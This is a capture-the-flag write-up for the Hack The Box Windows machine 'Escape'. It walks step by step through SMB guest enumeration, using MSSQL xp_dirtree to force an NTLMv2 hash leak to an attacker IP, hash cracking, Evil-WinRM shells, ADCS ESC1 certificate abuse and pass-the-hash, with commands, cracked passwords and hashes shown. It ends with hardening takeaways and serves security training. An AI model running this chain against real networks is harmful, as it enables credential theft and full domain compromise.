# HTB Write-Up: Escape

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Escape)     |
| Difficulty | Medium                                                         |
| OS         | Windows                                                        |
| Date       | June 18, 2026                                                  |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB Public Share & MSSQL Access](#2-enumeration--smb-public-share--mssql-access)
3. [Initial Access — MSSQL NTLMv2 Hash Capture & Credential Recovery](#3-initial-access--mssql-ntlmv2-hash-capture--credential-recovery)
4. [Lateral Movement — SQL Server Error Log Credential Leak](#4-lateral-movement--sql-server-error-log-credential-leak)
5. [Privilege Escalation — ADCS ESC1 Certificate Abuse](#5-privilege-escalation--adcs-esc1-certificate-abuse)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery followed by a detailed **Nmap** service scan:

```bash
rustscan -a 10.129.17.254 --ulimit 5000
```

**Open Ports:**

| Port  | Service         | Details                                          |
|-------|-----------------|--------------------------------------------------|
| 53    | DNS             | Simple DNS Plus                                  |
| 88    | Kerberos        | Microsoft Windows Kerberos                       |
| 135   | MSRPC           | Microsoft Windows RPC                            |
| 139   | NetBIOS         | Microsoft Windows netbios-ssn                    |
| 389   | LDAP            | Domain: `sequel.htb`                             |
| 445   | SMB             | microsoft-ds                                     |
| 464   | kpasswd5        | tcpwrapped                                       |
| 593   | HTTP-RPC        | RPC over HTTP 1.0                                |
| 636   | LDAPSSL         | tcpwrapped                                       |
| 1433  | MSSQL           | Microsoft SQL Server 2019 RTM (15.00.2000.00)    |
| 3268  | Global Catalog  | Microsoft Windows Active Directory LDAP          |
| 3269  | Global Catalog SSL | Microsoft Windows Active Directory LDAP       |
| 5985  | WinRM           | Windows Remote Management                        |
| 9389  | ADWS            | Active Directory Web Services                    |

The host is a **Domain Controller** running **Windows Server 2019** (Build 17763), hostname **DC**, domain: **`sequel.htb`**. The presence of port **1433** (MSSQL) is notable and distinguishes this machine from a typical pure-AD target.

---

## 2. Enumeration — SMB Public Share & MSSQL Access

### 2.1 — Anonymous & Guest SMB Enumeration

Null authentication was tested first:

```bash
netexec smb 10.129.17.254 -u '' -p '' --shares
```

Null auth was accepted but share enumeration returned `STATUS_ACCESS_DENIED`. Guest authentication succeeded and revealed a non-standard share:

```bash
netexec smb 10.129.17.254 -u 'guest' -p '' --shares
```

**Output:**

```
SMB  10.129.17.254  445  DC  Share       Permissions  Remark
SMB  10.129.17.254  445  DC  -----       -----------  ------
SMB  10.129.17.254  445  DC  ADMIN$                   Remote Admin
SMB  10.129.17.254  445  DC  C$                       Default share
SMB  10.129.17.254  445  DC  IPC$        READ         Remote IPC
SMB  10.129.17.254  445  DC  NETLOGON                 Logon server share
SMB  10.129.17.254  445  DC  Public      READ
SMB  10.129.17.254  445  DC  SYSVOL                   Logon server share
```

The **`Public`** share is readable without credentials.

### 2.2 — Public Share Contents

```bash
smbclient //10.129.17.254/Public -N
smb: \> ls
smb: \> get "SQL Server Procedures.pdf"
```

The share contained a single file: **`SQL Server Procedures.pdf`**. This PDF contained internal documentation including a note for new hires:

> For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user **`PublicUser`** and password **`GuestUserCantWrite1`**.

Credentials for the MSSQL instance were leaked in plain text inside an internal document on an unauthenticated share.

### 2.3 — MSSQL Enumeration as PublicUser

The leaked credentials were used to connect to the SQL Server:

```bash
impacket-mssqlclient 'PublicUser':'GuestUserCantWrite1'@sequel.htb -port 1433
```

The account had very limited permissions — no `sysadmin` role, no `xp_cmdshell`, no `BULK INSERT`, and no linked servers of interest. Impersonation targets were also empty. However, the `xp_dirtree` extended stored procedure was available and could be used to trigger outbound SMB connections.

---

## 3. Initial Access — MSSQL NTLMv2 Hash Capture & Credential Recovery

### 3.1 — NTLMv2 Hash Capture via xp_dirtree

An **Responder** listener was started to capture incoming NTLMv2 authentication attempts:

```bash
sudo responder -I tun0 -wv
```

A UNC path pointing to the attacker's machine was passed to `xp_dirtree`, forcing the SQL Server service account to authenticate outbound over SMB:

```sql
EXEC master..xp_dirtree '\\10.10.15.24\share\'
```

Responder captured the NTLMv2 hash for the service account running MSSQL:

```
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:246ff7bca98cdc85:28E4D7C5AEE2...
```

### 3.2 — Hash Cracking with Hashcat

The captured NTLMv2 hash was cracked offline using Hashcat against the rockyou wordlist:

```bash
hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
SQL_SVC::sequel:...:REGGIE1234ronnie
Status: Cracked
```

Credentials recovered: **`sql_svc:REGGIE1234ronnie`**

### 3.3 — Shell via WinRM

The cracked credentials were tested against WinRM:

```bash
netexec winrm sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
# [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

A shell was obtained:

```bash
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

---

## 4. Lateral Movement — SQL Server Error Log Credential Leak

### 4.1 — SQL Server Log Discovery

Post-exploitation enumeration of the filesystem revealed a SQL Server installation directory:

```powershell
*Evil-WinRM* PS C:\> cd SqlServer\Logs
*Evil-WinRM* PS C:\SqlServer\Logs> ls
# ERRORLOG.BAK
```

### 4.2 — Plaintext Password in Error Log

The `ERRORLOG.BAK` file contained SQL Server authentication failure logs. A misconfigured login attempt had inadvertently logged a plaintext password in the username field:

```
2022-11-18 13:43:07.44  Logon failed for user 'sequel.htb\Ryan.Cooper'. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48  Logon failed for user 'NuclearMosquito3'. [CLIENT: 127.0.0.1]
```

The second failed login used **`NuclearMosquito3`** as the username — a clear case of a user accidentally typing their password into the username field. Given the preceding line references `Ryan.Cooper`, the password was immediately attributed to that account.

Credentials recovered: **`ryan.cooper:NuclearMosquito3`**

### 4.3 — Confirming Access

```bash
netexec smb sequel.htb -u ryan.cooper -p 'NuclearMosquito3'
# [+] sequel.htb\ryan.cooper:NuclearMosquito3
```

---

## 5. Privilege Escalation — ADCS ESC1 Certificate Abuse

### 5.1 — BloodHound Enumeration

BloodHound data was collected as `ryan.cooper` and revealed that the account had rights to enroll in certificate templates via Active Directory Certificate Services (AD CS).

### 5.2 — Vulnerable Certificate Template Discovery

**Certipy** was used to enumerate the CA and identify vulnerable certificate templates:

```bash
certipy-ad find -dc-host dc.sequel.htb \
  -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' \
  -vulnerable -stdout
```

**Finding:**

```
Certificate Templates
  0
    Template Name          : UserAuthentication
    Enrollee Supplies Subject : True
    Client Authentication  : True
    Enrollment Rights      : SEQUEL.HTB\Domain Users

    [!] Vulnerabilities
      ESC1 : Enrollee supplies subject and template allows client authentication.
```

The `UserAuthentication` template is vulnerable to **ESC1**: it allows any Domain User to enroll and specify an arbitrary Subject Alternative Name (SAN), including a UPN for a privileged account such as `Administrator`.

**What is ESC1?** Certificate templates in AD CS can be misconfigured to allow enrollees to supply their own subject in the certificate request. When the template also permits client authentication, an attacker can request a certificate with the UPN of any domain account — including Domain Admin — and use that certificate to authenticate as that account via Kerberos PKINIT, effectively impersonating them without knowing their password.

### 5.3 — Requesting a Certificate as Administrator

A certificate was requested for the `administrator` UPN using `ryan.cooper`'s credentials:

```bash
certipy-ad req \
  -u 'ryan.cooper' -p "NuclearMosquito3" \
  -dc-ip "10.129.17.254" \
  -ca 'sequel-DC-CA' \
  -template 'UserAuthentication' \
  -upn 'administrator' \
  -target 'dc.sequel.htb' \
  -key-size 4096
```

**Output:**

```
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

### 5.4 — Authenticating & Extracting the NT Hash

The clock was synchronized with the DC first (required for Kerberos):

```bash
sudo ntpdate sequel.htb
```

The certificate was used to authenticate and retrieve the Administrator's NT hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.17.254 -domain sequel.htb
```

**Output:**

```
[*] Got TGT
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

### 5.5 — Root Flag via Pass-the-Hash

```bash
evil-winrm -i sequel.htb -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
406b1ebdd8bbcf84177dc5c5cb90a7ac
```

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan + Nmap | DC identified, Windows Server 2019; MSSQL on port 1433 noted |
| SMB Enumeration | NetExec guest auth | `Public` share readable; SQL credentials in PDF |
| MSSQL Access | impacket-mssqlclient | Connected as `PublicUser`; `xp_dirtree` available |
| Hash Capture | Responder + xp_dirtree | NTLMv2 hash for `sql_svc` captured |
| Hash Cracking | Hashcat rockyou | `sql_svc:REGGIE1234ronnie` recovered |
| Initial Shell | Evil-WinRM | Shell as `sql_svc` on DC |
| Credential Leak | SQL Server ERRORLOG.BAK | `ryan.cooper:NuclearMosquito3` found in error log |
| ADCS Enumeration | Certipy find | `UserAuthentication` template vulnerable to ESC1 |
| ESC1 Abuse | Certipy req + auth | Certificate issued as `administrator`; NT hash extracted |
| Root | Evil-WinRM Pass-the-Hash | `root.txt` from `C:\Users\Administrator\Desktop` |

### Key Takeaways

- **Sensitive documentation must never be placed on unauthenticated shares.** The `Public` SMB share was readable by any guest and contained a PDF with valid database credentials. Internal documentation referencing credentials — even "low-privilege" ones — must be restricted to authenticated, need-to-know principals.

- **SQL Server service accounts should be denied outbound SMB.** The `xp_dirtree` procedure triggered an outbound NTLMv2 authentication that leaked the service account's password hash. Firewall rules should block outbound SMB from database servers, and `xp_dirtree` / `xp_fileexist` should be disabled if not explicitly required.

- **SQL Server error logs are a high-value credential source.** When a user mistypes their password into the username field, SQL Server logs the attempt verbatim. These log files are frequently overlooked during hardening. Log directories should be access-controlled and logs should be periodically reviewed and rotated.

- **ADCS ESC1 is a critical privilege escalation path in misconfigured environments.** Any certificate template that allows enrollees to supply their own subject and permits client authentication is a direct path to domain compromise. The `EnrolleeSuppliesSubject` flag should be removed from templates enrolled to broad groups, and certificate issuance should require manager approval or authorized signatures for sensitive templates.

- **Certificate-based authentication bypasses password-based defenses entirely.** A valid certificate for an account allows full Kerberos authentication regardless of the account's password, MFA configuration, or logon restrictions. AD CS must be treated as a Tier 0 asset equivalent to the DC itself, with its templates and permissions audited continuously.
